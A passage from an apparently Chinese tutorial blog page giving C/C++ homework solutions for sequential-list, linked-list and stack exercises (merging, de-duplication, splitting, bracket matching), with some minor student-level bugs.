&amp;l.arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">l.length = n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outsqlist(sqlist l)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">printf(&quot;顺序表的元素为：\n&quot;);</span><br><span class="line">for(i = 0; i&lt;l.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;, l.arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void swap(int &amp;a, int &amp; b)</span><br><span class="line">&#123;</span><br><span class="line">int temp;</span><br><span class="line">temp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sortsqlist(sqlist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">for(int i = 0; i&lt;l.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">for(int j = 0; j&lt;l.length-1; j++)</span><br><span class="line">&#123;</span><br><span class="line">if(l.arr[j] &gt; l.arr[j+1])</span><br><span class="line">&#123;</span><br><span class="line">swap(l.arr[j], l.arr[j+1]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">sqlist l;</span><br><span class="line">createsqlist(l);</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入元素个数n:\n&quot;);scanf(&quot;%d&quot;, &amp;n);insqlist(l, n);sortsqlist(l);outsqlist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//20、已知二个有序的顺序la与lb，其中la=&#123;a1,a2,...an&#125;，lb=&#123;b1,b2,...bm&#125;， 试设计一个算法将它们合并到顺序表lc中，且lc仍然有序，再输出</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">const int maxn = 1000 + 10;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int *arr;</span><br><span class="line">int length;</span><br><span class="line">int maxsize;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line">void createsqlist(sqlist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">l.arr = (int*) malloc (maxn * sizeof(int));</span><br><span class="line">l.length = 0;</span><br><span class="line">l.maxsize = maxn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insqlist(sqlist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入数字来创建顺序表：\n&quot;);</span><br><span class="line">for(int i = 0; i&lt;n; i++)</span><br><span class="line">&#123;</span><br><span class="line">scanf(&quot;%d&quot;, &amp;l.arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">l.length = n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outsqlist(sqlist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;顺序表的元素为：\n&quot;);</span><br><span class="line">for(int i = 0; i&lt;l.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;, l.arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void swap(int &amp;a, int &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">int temp;</span><br><span class="line">temp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void merger(sqlist &amp;l1, sqlist &amp;l2, sqlist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">for(int i = 0; i&lt;l1.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">l3.arr[i] = l1.arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">l3.length = l1.length;for(int i = 0; i&lt;l2.length; i++)&#123;l3.arr[l1.length+i] = l2.arr[i];&#125;l3.length += l2.length;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sortsqlist(sqlist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">for(int i = 0; i&lt;l.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">for(int j = 0; j&lt;l.length-1; j++)</span><br><span class="line">&#123;</span><br><span class="line">if(l.arr[j] &gt; l.arr[j+1])</span><br><span class="line">&#123;</span><br><span class="line">swap(l.arr[j], l.arr[j+1]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n, m;</span><br><span class="line">sqlist l1, l2, l3;</span><br><span class="line">createsqlist(l1);</span><br><span class="line">createsqlist(l2);</span><br><span class="line">createsqlist(l3);</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入元素的个数n:\n&quot;);scanf(&quot;%d%d&quot;, &amp;n, &amp;m);insqlist(l1, n);insqlist(l2, m);merger(l1, l2, l3);sortsqlist(l3);outsqlist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//21、设计一个算法，以先进先出的方式创建一个带头结点的单向链表，并输出</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*Linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(Linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (Linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">Linklist p, END;//定义尾部节点</span><br><span class="line">END = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入想要创建的链表元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (Linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);END-&gt;next = p;p -&gt; next = NULL;END = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(Linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的为：\n&quot;);</span><br><span class="line">Linklist p;</span><br><span class="line">p = l -&gt; next;</span><br><span class="line"></span><br><span class="line">while(p != NULL)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Linklist L;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素个数n:\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(L, n);outlinklist(L);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//22、设计一个算法，以后进先出的方式创建一个带头结点的单向链表，并输出</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node *next;</span><br><span class="line">&#125;*Linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(Linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (Linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);</span><br><span class="line"></span><br><span class="line">for(int i = n; i&gt;0; i--)&#123;Linklist p;p = (Linklist) malloc(sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);p-&gt;next = l-&gt;next;l-&gt;next = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(Linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的值为：\n&quot;);</span><br><span class="line"></span><br><span class="line">Linklist p;p = l-&gt;next;while(p != NULL)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Linklist L;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表元素个数n:\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(L, n);outlinklist(L);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//23、设计一个算法，以先进先出的方式创建一个带头结点的双向链表，并输出</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node *next;</span><br><span class="line">struct Node *prior;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist p, end;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">l-&gt;prior = NULL;</span><br><span class="line">end = l;</span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);</span><br><span class="line">for(int i = 0; i&lt;n; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = (linklist) malloc (sizeof(Node));</span><br><span class="line">scanf(&quot;%d&quot;, &amp;p-&gt;elem);</span><br><span class="line">end-&gt;next = p;</span><br><span class="line">p-&gt;prior = end;</span><br><span class="line">end = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">end-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p != NULL)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表元素个数:\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//24、试编写算法创建一个带头结点的单向循环链表la=&#123;a1,a2,...an&#125;，并从指定的结点序号起输出循环链表</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入要创建的链表的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;end-&gt;next = l;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表的值为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void special_traversal(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p = l;</span><br><span class="line">int i = 0;</span><br><span class="line"></span><br><span class="line">while(p &amp;&amp; i&lt;n)&#123;p = p-&gt;next;i++;&#125;while(p &amp;&amp; p-&gt;next != l-&gt;next)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n, m;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);printf(&quot;请输入指定的节点序号：\n&quot;);scanf(&quot;%d&quot;, &amp;m);special_traversal(l, m);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//25、已知带头结点的单链表la=&#123;a1,a2,...an&#125;，试编写一个算法将值重复的结点删除，使所得的结果表中的值均不相同。 </span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">    int elem;</span><br><span class="line">    struct  Node *next;</span><br><span class="line">&#125;*Linklist;</span><br><span class="line">void inlinklist(Linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">    l = (Linklist)malloc(sizeof(Node));</span><br><span class="line">    l-&gt;next = NULL;</span><br><span class="line">    Linklist p, END;//定义尾部节点</span><br><span class="line">    END = l;</span><br><span class="line">    printf(&quot;请输入想要创建的链表元素:\n&quot;);</span><br><span class="line">    for(int i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (Linklist)malloc(sizeof(Node));</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;p-&gt;elem);</span><br><span class="line">        END -&gt; next = p;</span><br><span class="line">        p-&gt;next = NULL;</span><br><span class="line">        END = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void outlinklist(Linklist l)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;链表中的值为:\n&quot;);</span><br><span class="line">    Linklist  p;</span><br><span class="line">    p = l-&gt;next;</span><br><span class="line">    while(p != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d &quot;, p-&gt;elem);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void delete_repeat(Linklist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">Linklist p, q, s;</span><br><span class="line">p = l;</span><br><span class="line"></span><br><span class="line">while(p)&#123;q = p;while(q-&gt;next)&#123;if(q-&gt;next-&gt;elem == p-&gt;elem)&#123;s = q-&gt;next;q-&gt;next = s-&gt;next;free(s);&#125;else&#123;q = q-&gt;next;&#125;&#125;p = p-&gt;next;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数:\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);delete_repeat(l);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//26、有一有序的单向链表（允许出现值相同的结点），试设计一个算法将值重复的结点删除，使所得的结果表中的值均不相同。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">    int elem;</span><br><span class="line">    struct  Node *next;</span><br><span class="line">&#125;*Linklist;</span><br><span class="line">void inlinklist(Linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">    l = (Linklist)malloc(sizeof(Node));</span><br><span class="line">    l-&gt;next = NULL;</span><br><span class="line">    Linklist p, END;//定义尾部节点</span><br><span class="line">    END = l;</span><br><span class="line">    printf(&quot;请输入想要创建的链表元素:\n&quot;);</span><br><span class="line">    for(int i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (Linklist)malloc(sizeof(Node));</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;p-&gt;elem);</span><br><span class="line">        END -&gt; next = p;</span><br><span class="line">        p-&gt;next = NULL;</span><br><span class="line">        END = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void outlinklist(Linklist l)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;链表中的值为:\n&quot;);</span><br><span class="line">    Linklist  p;</span><br><span class="line">    p = l-&gt;next;</span><br><span class="line">    while(p != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d &quot;, p-&gt;elem);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void delorder_repeat(Linklist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">Linklist p, q;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p-&gt;next)&#123;if(p-&gt;next-&gt;elem == p-&gt;elem)&#123;q = p-&gt;next;p-&gt;next = q-&gt;next;free(q);&#125;elsep = p-&gt;next;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数:\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);delorder_repeat(l);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//27、已知一个带头结点的单链表lc中结点数据元素类型为字符型数据，主要包括二类字符（字母字符与数字字符），</span><br><span class="line">//试设计一个算法，将lc拆分成二个链表la与lb，其中la的数据为字母字符，lb的数据为数字字符。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">char elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc(sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表元素(字符型数据)：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%c&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为:\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%c &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void splitlinklist(linklist &amp;l1, linklist &amp;l2, linklist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">l2 = (linklist) malloc (sizeof(Node));</span><br><span class="line">l3 = (linklist) malloc (sizeof(Node));</span><br><span class="line">l2-&gt;next = NULL;</span><br><span class="line">l3-&gt;next = NULL;</span><br><span class="line">linklist q, p, s;</span><br><span class="line">p = l1-&gt;next;</span><br><span class="line">q = l2;</span><br><span class="line">s = l3;</span><br><span class="line"></span><br><span class="line">while(p)&#123;if(((p-&gt;elem) &gt;= &#x27;a&#x27; &amp;&amp; (p-&gt;elem) &lt;= &#x27;z&#x27;) || ((p-&gt;elem) &gt;= &#x27;A&#x27; &amp;&amp; (p-&gt;elem) &lt;= &#x27;Z&#x27;))&#123;q-&gt;next = p;q = q-&gt;next;p = p-&gt;next;&#125;else if((p-&gt;elem) &gt;= &#x27;0&#x27; &amp;&amp; (p-&gt;elem) &lt;= &#x27;9&#x27;)&#123;s-&gt;next = p;p = p-&gt;next;s = s-&gt;next;&#125;&#125;q-&gt;next = NULL;s-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l1, l2, l3;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);getchar();inlinklist(l1 ,n);splitlinklist(l1, l2, l3);outlinklist(l2);outlinklist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//28、设单链表的前二个结点值为均为１，从第三个结点开始，结点值为前二个结点值之和，试设计一个具有ｎ（２５＞ｎ＞＝３）个结点的单向链表，并输出。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">const int maxn = 100;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">int arr[maxn];</span><br><span class="line"></span><br><span class="line">void fibonacci_number(int arr[maxn])</span><br><span class="line">&#123;</span><br><span class="line">arr[1] = arr[2] = 1;</span><br><span class="line">for(int i = 3; i&lt;=maxn; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = arr[i-1] + arr[i-2];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc(sizeof(Node));p-&gt;elem = arr[i+1];end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n;</span><br><span class="line">fibonacci_number(arr);</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数ｎ(２５＞ｎ＞＝３)：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0、从键盘上输入一串括号组成的字符串，试编写一个算法，判断</span><br><span class="line">所输入的括号是否匹配，如匹配输出１否则输出０</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define overflow -2</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef char elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">elemtype *base,*top;</span><br><span class="line">int stacksize;</span><br><span class="line">&#125;sqstack;</span><br><span class="line">status initstack(sqstack &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">s.base=(elemtype*)malloc(sizeof(elemtype)*M);</span><br><span class="line">if(s.base==NULL)exit(overflow);</span><br><span class="line">s.top=s.base;</span><br><span class="line">s.stacksize=M;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">status push(sqstack &amp;s,elemtype e)</span><br><span class="line">&#123;</span><br><span class="line">if(s.top-s.base&gt;=M-1)return error;</span><br><span class="line">*s.top++=e;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">status pop(sqstack &amp;s,elemtype &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">if(s.top!=s.base)</span><br><span class="line">e=*--s.top;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">int bug(elemtype n,elemtype m)</span><br><span class="line">&#123;</span><br><span class="line">int flag=0;</span><br><span class="line">if(n==&#x27;&#123;&#x27;&amp;&amp;m==&#x27;&#125;&#x27;)flag=1;</span><br><span class="line">if(n==&#x27;(&#x27;&amp;&amp;m==&#x27;)&#x27;)flag=1; </span><br><span class="line">if(n==&#x27;[&#x27;&amp;&amp;m==&#x27;]&#x27;)flag=1;</span><br><span class="line">return flag;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">sqstack s;</span><br><span class="line">elemtype e,w;</span><br><span class="line">int flag=0;</span><br><span class="line">initstack(s);</span><br><span class="line">printf(&quot;请输入字符以0结尾:\n&quot;);</span><br><span class="line">scanf(&quot;%c&quot;,&amp;e);</span><br><span class="line">while(e!=&#x27;0&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">if(e==&#x27;&#123;&#x27;||e==&#x27;(&#x27;||e==&#x27;[&#x27;) </span><br><span class="line">push(s,e);</span><br><span class="line">if((e==&#x27;&#125;&#x27;||e==&#x27;)&#x27;||e==&#x27;]&#x27;)&amp;&amp;(s.top!=s.base))</span><br><span class="line">&#123;</span><br><span class="line">if(flag=bug(*(s.top-1),e))</span><br><span class="line">pop(s,w);</span><br><span class="line">else push(s,e);</span><br><span class="line">&#125;</span><br><span class="line">scanf(&quot;%c&quot;,&amp;e);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;判断所输入的括号是否匹配(匹配输出１否则输出０):\n&quot;); </span><br><span class="line">if(flag&amp;&amp;(s.top==s.base))printf(&quot;1\n&quot;);</span><br><span class="line">else printf(&quot;0\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1、从键盘上输入一个十进制数n，试编写一个算法，将其转换成</span><br><span class="line">对应的ｐ进制输出（ｐ为２、８、１６）</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define overflow -2</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int 